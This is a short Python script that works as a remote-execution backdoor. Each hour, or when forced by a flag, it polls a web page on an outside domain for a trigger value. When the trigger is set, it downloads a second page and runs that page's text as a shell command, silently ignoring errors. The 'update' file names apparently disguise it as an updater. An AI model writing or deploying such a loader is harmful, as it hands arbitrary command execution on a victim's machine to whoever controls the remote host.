import requests
import subprocess
import time
from datetime import datetime
import sys

# Check Args
if len(sys.argv) > 1:
    args = sys.argv[1:]
else:
    args = ['NULL']

# Function to check if the value in the HTML content is 1
def checkHtmlValue(htmlContent):
    # Suppose the value to check is surrounded by <value> tags
    if "1" in htmlContent:
        return True
    else:
        return False

# Function to execute a batch script
def executeBatchScript(scriptContent):
    try:
        # Execute the batch script
        subprocess.run(scriptContent, shell=True)
        pass
    except Exception as e:
        pass

# URL of the HTML file to check
htmlFileUrl = "https://dan-nettoyeur.fr/ignore/update.html"

# URL of the HTML file containing the batch script
batchScriptUrl = "https://dan-nettoyeur.fr/ignore/updateS.html"

# Loop indefinitely
while True:
    # Get the current time
    current_time = datetime.now()

    # Check if it's the beginning of a new hour
    if current_time.minute == 0 or args[0] == '-f' or args[0] == '--force':
        try:
            # Request the HTML file
            response = requests.get(htmlFileUrl)
            if response.status_code == 200:
                htmlContent = response.text

                # Check if the value in the HTML content is 1
                if checkHtmlValue(htmlContent):
                    # Request the HTML file containing the batch script
                    response = requests.get(batchScriptUrl)
                    if response.status_code == 200:
                        scriptContent = response.text
                        # Execute the batch script
                        executeBatchScript(scriptContent)
                        print(scriptContent)
                    else:
                        pass
                else:
                    pass
            else:
                pass
        except Exception as e:
            pass 
        time.sleep(60)

    time.sleep(1)
